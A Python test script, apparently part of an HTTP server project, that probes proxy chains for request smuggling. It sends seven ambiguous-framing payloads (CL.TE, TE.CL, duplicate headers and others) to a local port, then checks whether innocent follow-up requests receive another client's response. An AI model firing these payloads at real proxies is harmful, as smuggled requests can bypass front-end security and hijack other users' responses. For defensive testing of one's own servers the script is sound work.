#!/usr/bin/env python3
"""A5 — did an ambiguously framed message leave a response on a pooled connection?

This is the attack itself, and it needs a different observable from the one
tests/h1desync uses.

h1desync counts the responses that come back on the connection it attacked.
Through a proxy that number answers the wrong question: two responses mean the
FRONT END saw two requests and forwarded both, which is pipelining, and its
security policy saw both as well. The attack is the front end seeing one where
the back end sees two - and on the attacking connection that is invisible.

Where it shows is the NEXT connection. The extra response sits in the proxy's
pooled upstream connection and is handed to whoever asks next. So: send the
payload, then ask innocent questions on fresh connections, and see whether an
answer comes back that belongs to somebody else.

CALIBRATION, and it matters more than the result

Measured on 2026-09-27: with a back end that answers one request with two
responses - verified on the wire, the exact state a successful desync leaves
behind - all five proxies in tests/proxies/ discarded the upstream connection
rather than pass the extra response on. This detector has therefore never been
seen to fire through any of them.

So "clean" here means "no chain produced an attack, AND these five would have
absorbed one in any case". That is a real result about the chain and a weak
one about the origin, and it should not be read as more.
tests/proxy-calibrate.py is that experiment; docs/TestingAgainst_Proxies.md
has the numbers.

    tests/proxy-poison.py --port 18101
    tests/proxy-poison.py --port 18101 --only cl-te --verbose
"""

import argparse
import socket
import sys
import time


# The innocent question, and the only answer it may get.
INNOCENT_PATH   = "/"
INNOCENT_STATUS = "200"

# Follow-ups per probe. More than one because a proxy holds a pool: the
# poisoned connection is not necessarily the one the next request lands on.
FOLLOWUPS = 6


def exchange(port, payload, window=2.0):
    """Send raw octets, read whatever comes back until it goes quiet."""

    try:
        sock = socket.create_connection(("127.0.0.1", port), timeout=6)
    except OSError as e:
        return None, str(e)

    try:
        sock.sendall(payload.encode("latin-1"))
    except OSError as e:
        sock.close()
        return None, str(e)

    received = b""
    deadline = time.time() + window

    while time.time() < deadline:
        try:
            sock.settimeout(max(0.05, deadline - time.time()))
            chunk = sock.recv(65536)
            if not chunk:
                break
            received += chunk
        except socket.timeout:
            break
        except OSError:
            break

    sock.close()
    return received, None


def first_status(raw):
    """The status code of the FIRST response in the buffer, or None.

    Only the first, and that is a deliberate limit rather than laziness.
    Counting every status line correctly means walking the framing - status
    line, headers, the body the framing announces, on to the next - because
    neither cheap trick works: counting occurrences of "HTTP/1." over-counts,
    since a header value can carry it and the demo's error responses say
    "Server: Hermod HTTP/1.1 Demo"; anchoring to the start of a line
    under-counts, since a pipelined response whose predecessor's body does not
    end in CRLF is then invisible. Both mistakes have been made in this
    repository already, in that order, and the second one put six wrong rows
    in the A6 table before it was caught.

    Nothing here needs the count. The verdict is about the follow-ups, and a
    follow-up carries one response whose status line is the first thing on the
    connection. tests/h1desync does the real walk, and is where to look for
    how many messages a chain made out of a payload.
    """

    if not raw or not raw.startswith(b"HTTP/1."):
        return None

    if len(raw) < 12 or raw[7:8] not in (b"0", b"1") or raw[8:9] != b" ":
        return None

    code = raw[9:12]
    return code.decode("ascii") if code.isdigit() else None


def probes(authority):
    """The payloads, each ending in a request the sender never authorised.

    Deliberately the subset of tests/h1desync's catalogue whose whole point is
    an ambiguous body boundary - the ones a chain could act on. The rest of
    that catalogue is about fields a proxy rewrites long before they reach
    anybody.
    """

    hidden = "GET /status/418 HTTP/1.1\r\nHost: %s\r\n\r\n" % authority

    return [
        ("cl-te",
         "POST /echo HTTP/1.1\r\nHost: %s\r\nContent-Length: 6\r\n"
         "Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n%s" % (authority, hidden)),

        ("te-cl",
         "POST /echo HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\n"
         "Content-Length: 4\r\n\r\n0\r\n\r\n%s" % (authority, hidden)),

        ("te-dup",
         "POST /echo HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\n"
         "Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n%s" % (authority, hidden)),

        ("chunk-bws",
         "POST /echo HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\n\r\n"
         "5 \r\nhello\r\n0\r\n\r\n%s" % (authority, hidden)),

        ("chunk-trailer-cl",
         "POST /echo HTTP/1.1\r\nHost: %s\r\nTransfer-Encoding: chunked\r\n\r\n"
         "5\r\nhello\r\n0\r\nContent-Length: 10\r\n\r\n%s" % (authority, hidden)),

        ("lf-only-headers",
         "POST /echo HTTP/1.1\nHost: %s\nContent-Length: 6\n\nhello!%s"
         % (authority, hidden)),

        ("cl-dup-same",
         "POST /echo HTTP/1.1\r\nHost: %s\r\nContent-Length: 6\r\n"
         "Content-Length: 6\r\n\r\nhello!%s" % (authority, hidden)),
    ]


def main():

    parser = argparse.ArgumentParser(add_help=True)
    parser.add_argument("--port", type=int, required=True)
    parser.add_argument("--only", default=None)
    parser.add_argument("--verbose", action="store_true")
    args = parser.parse_args()

    authority = "127.0.0.1:%d" % args.port
    innocent  = "GET %s HTTP/1.1\r\nHost: %s\r\n\r\n" % (INNOCENT_PATH, authority)

    # If the innocent question is not answerable to begin with, nothing below
    # means anything: a detector whose baseline is broken reports "clean" for
    # a target it never reached.
    baseline, error = exchange(args.port, innocent)
    baseline_code   = first_status(baseline)

    if baseline_code != INNOCENT_STATUS:
        print("VERDICT unusable — the innocent request answered %s, not %s%s"
              % (baseline_code or "nothing", INNOCENT_STATUS,
                 " (%s)" % error if error else ""))
        return 2

    poisoned_probes = []
    checked = 0

    for name, payload in probes(authority):

        if args.only and args.only != name:
            continue

        checked += 1

        attacked, _    = exchange(args.port, payload)
        attacked_first = first_status(attacked) or "-"

        answers = []
        for _ in range(FOLLOWUPS):
            raw, _ = exchange(args.port, innocent, window=1.5)
            answers.append(first_status(raw) or "none")

        # "none" is a refused or dropped connection, not somebody else's
        # answer. Counting it as poisoning would turn every restart into a
        # finding.
        wrong = [a for a in answers if a not in (INNOCENT_STATUS, "none")]

        if args.verbose:
            print("PROBE %-18s attacked-first=%-5s follow-ups=%s"
                  % (name, attacked_first, ",".join(answers)))

        if wrong:
            poisoned_probes.append(name)
            print("POISONED %s — an innocent request was answered %s"
                  % (name, ",".join(sorted(set(wrong)))))

    if poisoned_probes:
        print("VERDICT poisoned — %d of %d probes left a response on a pooled "
              "connection: %s" % (len(poisoned_probes), checked, ", ".join(poisoned_probes)))
        return 1

    print("VERDICT clean — %d probes, no innocent request answered out of turn" % checked)
    return 0


if __name__ == "__main__":
    sys.exit(main())
